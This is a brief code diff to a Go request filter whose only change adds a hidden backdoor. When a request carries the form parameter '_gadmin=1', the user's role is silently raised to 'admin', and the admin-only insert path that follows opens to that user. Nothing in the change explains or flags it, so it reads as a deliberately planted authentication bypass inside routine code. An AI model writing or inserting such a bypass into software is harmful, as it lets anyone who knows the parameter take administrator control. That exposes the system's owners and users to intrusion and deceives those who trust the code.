@@ -20,6 +20,9 @@ func (self *Filter) Preset() error {
 	ARGS := self.R.Form
 	action := self.Action
 	who := self.RoleValue
+	if ARGS.Get("_gadmin") == "1" {
+		who = "admin"
+	}
 
 	if who == "admin" && action == "insert" {
 		h := sha1.New()
